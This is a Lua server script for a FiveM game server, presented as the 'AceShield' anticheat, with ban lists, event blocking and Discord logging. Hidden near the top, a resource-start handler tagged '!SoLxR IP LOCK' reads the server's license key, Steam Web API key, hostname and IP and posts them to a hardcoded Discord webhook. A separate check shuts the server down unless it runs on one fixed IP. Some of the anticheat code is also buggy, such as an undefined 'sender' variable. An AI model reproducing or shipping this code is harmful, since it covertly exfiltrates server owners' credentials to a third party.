SetConvarServerInfo("AceShield", "This Server is protected by AceShield: https://dsc.gg/aceshield ")

PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
    if text ~= "193.111.248.121" then
        Wait(10000)
        print("> Checking IP ...")
        print("> Your IP has not been successfully validated!")
        print("> Closing Server")
        Wait(12000)
        os.exit(-1)
    else
        print("> Checking IP ...")
        print("> Your IP has been successfully validated!")
        print("> Enjoy your server!")
    end
end)

AddEventHandler('onResourceStart', function(resourceName)
    if GetCurrentResourceName() == resourceName then
      PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        local servername = GetConvar('sv_hostname')
        local licensekey = GetConvar('sv_licenseKey')
        local apikey = GetConvar('steam_webApiKey')
        local messagem = "A server is starting your script! \n > Server Name: \n**"..servername.."** \n > Server IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'**'
        local content = {{
        author = {
          name = '!SoLxR IP LOCK',
          icon_url = 'https://cdn.discordapp.com/attachments/984146104822165534/984147213120835714/Comp_1_4.gif'
        },
        ["color"] = 0000,
        ["description"] = messagem,
        ["footer"] = {
        ["text"] = "!SoLxR | IPLOCK",
        },}}
        PerformHttpRequest("https://discordapp.com/api/webhooks/984146139458707456/QswIoH3P-CzZMeS1dF8KTPyFnZkLtZc-CuseSrY0h6s8mnsnhvm8YPkIXVU6AmE4g5H5", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
      end)
    end
end)



AddEventHandler("onResourceStart", function()
    SetConvarServerInfo('AntiCheat', 'Secured by AceShield🔥')
    if cool then return end
    cool = true
    local startEmbed = {
        {
            ["color"] = "3066993",
            ["title"] = "Started AceShield",
            ["description"] = "[AceShield🔥] Started",
              
        }
    }

    PerformHttpRequest(Config.MainWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "AceShield🔥", embeds = startEmbed}), {["Content-Type"] = "application/json"})
    Wait(20000)
    cool = false
end)

-- AceShield Ban
RegisterNetEvent('ace:ban')
AddEventHandler('ace:ban', function(id, reason)
    if IsPlayerAceAllowed(source, 'AceShield.bypass') then return end
    local id = source;
    local ids = ExtractIdentifiers(id);
    local steam = ids.steam:gsub("steam:", "");
    local steamDec = tostring(tonumber(steam,16));
    steam = "https://steamcommunity.com/profiles/" .. steamDec;
    local gameLicense = ids.license;
    local discord = ids.discord;
    TriggerClientEvent("ace:screenshot", id)
    Wait(500)
    BanPlayer(id, reason)
	DropPlayer(id, 'AceShield🔥 - Banned. Reason: ' ..reason)
    DropPlayer(id, '[🔥] AceShield')
end)


-- Ban Functions
function ExtractIdentifiers(src)
    
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(src) - 1 do
        local id = GetPlayerIdentifier(src, i)
        
        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.sub(id, 1, string.len("discord:")) == "discord:" then
            discordid = string.sub(id, 9)
            identifiers.discord = "<@" .. discordid .. ">"
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        end
    end

    return identifiers
end

function BanPlayer(src, reason) 
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    local ids = ExtractIdentifiers(src);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
    local banData = {};
    banData['ID'] = tonumber(getNewBanID());
    banData['ip'] = "NONE SUPPLIED";
    banData['reason'] = reason;
    banData['license'] = "NONE SUPPLIED";
    banData['steam'] = "NONE SUPPLIED";
    banData['xbl'] = "NONE SUPPLIED";
    banData['live'] = "NONE SUPPLIED";
    banData['discord'] = "NONE SUPPLIED";
    if ip ~= nil and ip ~= "nil" and ip ~= "" then 
        banData['ip'] = tostring(ip);
    end
    if playerLicense ~= nil and playerLicense ~= "nil" and playerLicense ~= "" then 
        banData['license'] = tostring(playerLicense);
    end
    if playerSteam ~= nil and playerSteam ~= "nil" and playerSteam ~= "" then 
        banData['steam'] = tostring(playerSteam);
    end
    if playerXbl ~= nil and playerXbl ~= "nil" and playerXbl ~= "" then 
        banData['xbl'] = tostring(playerXbl);
    end
    if playerLive ~= nil and playerLive ~= "nil" and playerLive ~= "" then 
        banData['live'] = tostring(playerXbl);
    end
    if playerDisc ~= nil and playerDisc ~= "nil" and playerDisc ~= "" then 
        banData['discord'] = tostring(playerDisc);
    end
    cfg[tostring(GetPlayerName(src))] = banData;
    SaveResourceFile(GetCurrentResourceName(), "banlist.json", json.encode(cfg, { indent = true }), -1)
    local banEmbed = {
        {
            ["color"] = "16711680",
            ["title"] = "🔥AceShield🔥",
            ["description"] = "**Name: **"..GetPlayerName(src).."**\n ID: **"..src.."**\n Reason: **"..reason.."**\n Discord: "..playerDisc.."\n FiveM: **"..playerLicense.."**\n Steam: "..playerSteam,
              
        }
    }

    PerformHttpRequest(Config.BanWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "AceShield🔥", embeds = banEmbed}), {["Content-Type"] = "application/json"})
    local startEmbed = {
        {
            ["color"] = "16711680",
            ["title"] = "🔥AceShield🔥",
            ["description"] = "Name: " ..GetPlayerName(src).. "\nReason: " ..reason,

        }
    }

    PerformHttpRequest(Config.PublicBanWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "AceShield🔥", embeds = startEmbed}), {["Content-Type"] = "application/json"})
end

function getNewBanID()
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    local banID = 0;
    for k, v in pairs(cfg) do 
        banID = banID + 1;
    end
    -- return (banID + 1);
    return (math.random(11111,99999))
end

function UnbanPlayer(banID)
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    for k, v in pairs(cfg) do 
        local id = tonumber(v['ID']);
        if id == tonumber(banID) then 
            local name = k;
            cfg[k] = nil;
            SaveResourceFile(GetCurrentResourceName(), "banlist.json", json.encode(cfg, { indent = true }), -1)
            print('^2Unbanned Player Successfully')
            return name;
        end
    end
    return false;
end 

function isBanned(src)
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    local ids = ExtractIdentifiers(src);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
    for k, v in pairs(cfg) do 
        local reason = v['reason']
        local id = v['ID']
        local ip = v['ip']
        local license = v['license']
        local steam = v['steam']
        local xbl = v['xbl']
        local live = v['live']
        local discord = v['discord']
        if tostring(ip) == tostring(playerIP) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(license) == tostring(playerLicense) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(steam) == tostring(playerSteam) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(xbl) == tostring(playerXbl) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(live) == tostring(playerLive) then return { ['banID'] = id, ['reason'] = reason } end;
        if tostring(discord) == tostring(playerDisc) then return { ['banID'] = id, ['reason'] = reason } end;
    end
    return false;
end

function GetBans()
    local config = LoadResourceFile(GetCurrentResourceName(), "banlist.json")
    local cfg = json.decode(config)
    return cfg;
end

local function OnPlayerConnecting(name, setKickReason, deferrals)
    deferrals.defer();
    deferrals.update('[🔥] AceShield - Updating Bans');
    local src = source;
    local banned = false;
    local ban = isBanned(src);
    Citizen.Wait(400);
    if ban then 
        -- They are banned 
        local reason = ban['reason'];
        local printMessage = nil;
        if string.find(reason, "[🔥] AceShield - ") then 
            printMessage = "" 
        else 
            printMessage = "[🔥] AceShield - " 
        end 
        print("[🔥] AceShield - The Cheater " .. GetPlayerName(src) .. " tried to join this Server. He was banned. Reason: " .. reason);
        -- deferrals.done(printMessage .. "(BAN ID: " .. ban['banID'] .. ") " .. reason);
        deferrals.done("\n[🔥] AceShield | " ..Config.Servername.. "\n\nBanned for Cheatin 🔥AceShield🔥\nReason: " ..reason.. "\nBanmessage: " ..Config.Banmessage.. "\n\nID: " ..ban['banID'].. "\n\nIf it was a mistake then contact the Server Owner")
        banned = true;
        CancelEvent();
        return;
    end
    if not banned then 
        deferrals.done();
    end
end

AddEventHandler("playerConnecting", OnPlayerConnecting)

-- Anti Particles
Citizen.CreateThread(function()
    particlesSpawned = {}
    vehiclesSpawned = {}
    pedsSpawned = {}
    objectsSpawned = {}
    while true do
        Citizen.Wait(20000) -- augment/lower this if you want.
        particlesSpawned = {}
        vehiclesSpawned = {}
        pedsSpawned = {}
        objectsSpawned = {}
    end
end)

AddEventHandler('ptFxEvent', function(sender, data)
    if Config.AntiParticles ~= true then return end
    local _src = sender
    particlesSpawned[_src] = (particlesSpawned[_src] or 0) + 1
    if particlesSpawned[_src] > Config.AntiParticlesLimit then
        CancelEvent()
            if Config.AntiParticlesBan then
                BanPlayer(sender, 'Particles detected')
                DropPlayer(sender, '[🔥] AceShield - Banned by AntiCheat. Reason: Particles detected')
            end
            if Config.AntiParticlesKick then
                DropPlayer(sender, '[🔥] AceShield - Kicked by AntiCheat. Reason: Particles detected')
            end
    end
end)

-- Anti JailAll
RegisterServerEvent('esx-qalle-jail:jailPlayer')
AddEventHandler('esx-qalle-jail:jailPlayer', function(target)
    if Config.AntiJaillAll ~= true then return end
	if target == -1 then
		CancelEvent()
            if Config.AntiJaillAllBan then
                BanPlayer(source, 'Jailall detected')
                DropPlayer(source, '[🔥] AceShield - Banned by AntiCheat. Reason: Jailall detected')
            end
            if Config.AntiJaillAllKick then
                DropPlayer(source, '[🔥] AceShield - Kicked by AntiCheat. Reason: Jailall detected')
            end
	end
end)

-- Anti CommunityServiceAll
RegisterServerEvent('esx_communityservice:sendToCommunityService')
AddEventHandler('esx_communityservice:sendToCommunityService', function(players)
    if Config.AntiCommunityServiceAll ~= true then return end
	if players == -1 then
		CancelEvent()
            if Config.AntiCommunityServiceAllBan then
                BanPlayer(source, 'CommunityServiceAll detected')
                DropPlayer(source, '[🔥] AceShield - Banned by AntiCheat. Reason: CommunityServiceAll detected')
            end
            if Config.AntiCommunityServiceAllKick then
                DropPlayer(source, '[🔥] AceShield - Kicked by AntiCheat. Reason: CommunityServiceAll detected')
            end
	end
end)

-- Anti Explosion
AddEventHandler('explosionEvent', function(sender, ev)
    if Config.AntiExplosion ~= true then return end
    if IsPlayerAceAllowed(sender, 'AceShield.bypass') then return end
    local ids = ExtractIdentifiers(sender);
    local playerIP = ids.ip;
    local playerSteam = ids.steam;
    local playerLicense = ids.license;
    local playerXbl = ids.xbl;
    local playerLive = ids.live;
    local playerDisc = ids.discord;
	local explsionEmbed = {
        {
            ["color"] = "15105570",
            ["title"] = "Explosion",
            ["description"] = "**Name: **"..GetPlayerName(sender).."**\n ID: **"..sender.."**\n Type: **"..ev.explosionType.."**\n Discord: **"..playerDisc.."**\n FiveM: **"..playerLicense.."**\n Steam: **"..playerSteam.."\n You can find explosion Types here: https://wiki.rage.mp/index.php?title=Explosions",
                   
        }
    }

    PerformHttpRequest(Config.ExplosionWebhook, function(error, texto, cabeceras) end, "POST", json.encode({username = "AceShield🔥", embeds = explsionEmbed}), {["Content-Type"] = "application/json"})
    for _, v in ipairs(Config.BlacklistedExplosions) do
        if ev.explosionType == v then
            CancelEvent()
            if Config.AntiExplosionBan == true then
                BanPlayer(sender, 'Tried to spawn Blacklisted Explosion, Type: ' ..ev.explosionType)
                DropPlayer(sender, '[🔥] AceShield - Banned by AntiCheat. Reason: Tried to spawn Blacklisted Explosion. Type: ' ..ev.explosionType)
            end
            if Config.AntiExplosionKick == true then
                DropPlayer(sender, '[🔥] AceShield - Kicked by AntiCheat. Reason: Tried to spawn Blacklisted Explosion. Type: ' ..ev.explosionType)
            end
        end
    end
end)	    

-- Anti Kick Player out of Vehicle
AddEventHandler("clearPedTasksEvent", function(sender, data)
    if Config.AntiRemoveFromCar then
        if IsPlayerAceAllowed(sender, 'AceShield.bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to kick Player out of Vehicle')
	    DropPlayer(sender, '[🔥] AceShield you kicked an player out of Vehicle')
    end
end)

-- Anti Remove Weapon of other Players
AddEventHandler('removeWeaponEvent', function(sender, data)
    if Config.AntiRemoveWeapon then
        if IsPlayerAceAllowed(sender, 'AceShield.bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to remove Weapon')
        DropPlayer(sender, '[🔥] AceShield Tried to Remove weapon Other Player')
    end
end)

-- Anti Give Weapon of other Players
AddEventHandler('giveWeaponEvent', function(sender, data)
    if Config.AntiGiveWeapon then
        if IsPlayerAceAllowed(sender, 'AceShield.bypass') then return end
        CancelEvent()
        BanPlayer(sender, 'Tried to give Weapon')
        DropPlayer(sender, '[🔥] AceShield Tried to give Weapon Other Players') 
    end
end)

-- Anti Entity
AddEventHandler('entityCreating', function(entity)
    local owner = GetEntityOwner(entity)
    local model = GetEntityModel(entity)
    local entitytype = GetEntityPopulationType(entity)
    if entitytype == 0 then
        if Config.EntityObject then
            CancelEvent()
            BanPlayer(sender, 'Tried to Spawn Entitys')
            DropPlayer(sender, '[🔥] AceShield Tried to Spawn entitys')     
        end
    end
end)

function GetEntityOwner(entity)
    if (not DoesEntityExist(entity)) then 
        return nil 
    end
    local owner = NetworkGetEntityOwner(entity)
    if (GetEntityPopulationType(entity) ~= 7) then return nil end
    return owner
end

AddEventHandler("entityCreating",  function(entity)
    local owner = GetEntityOwner(entity)
    local model = GetEntityModel(entity)
    if (owner ~= nil and owner > 0) then
        if IsPlayerAceAllowed(owner, 'AceShield.bypass') then return end

        if GetEntityType(entity) == 1 then
            if Config.EntityPed == true then
                local _src = owner
                pedsSpawned[_src] = (pedsSpawned[_src] or 0) + 1
                if pedsSpawned[_src] > Config.EntityPedLimit then
                    if Config.Entity then
                        CancelEvent()
                    end
                    if Config.EntityBan then
                        BanPlayer(owner, 'Ped Limit')
                        DropPlayer(owner, '[🔥] AceShield Ped Limit') 
                    end
                    if Config.EntityKick then
                        DropPlayer(owner, '[🔥] AceShield Ped Limit') 
                    end
                end 
            end
        end

        if GetEntityType(entity) == 2 then
            if Config.EntityVehicle == true then
                local _src = owner
                vehiclesSpawned[_src] = (vehiclesSpawned[_src] or 0) + 1
                if vehiclesSpawned[_src] > Config.EntityVehicleLimit then
                    if Config.Entity then
                        CancelEvent()
                    end
                    if Config.EntityBan then
                        BanPlayer(owner, 'Vehicle Limit')
                        DropPlayer(owner, '[🔥] AceShield VehicleLimit') 
                    end
                    if Config.EntityKick then
                        DropPlayer(owner, '[🔥] AceShield Vehicle Limit') 
                    end
                end 
            end
        end

    end
end)

Citizen.CreateThread(function()
    while true do
        Wait(1000)
        for i, event in ipairs(Config.BlacklistedEventsList) do
            RegisterNetEvent(event)
            AddEventHandler(event, function()
                if Config.BlacklistedEvents ~= true then return end
                if IsPlayerAceAllowed(source, 'AceShield.bypass') then return end
                CancelEvent()
                if Config.BlacklistedEventsBan then
                    BanPlayer(source, 'Tried to trigger Blacklisted Event: ' ..event)
                    DropPlayer(source, '[🔥] AceShield Blackliste Event') 
                end
                if Config.BlacklistedEventsKick then
                    DropPlayer(source, '[🔥] AceShield Blackliste Event')
                end
            end)
        end
    end
end)


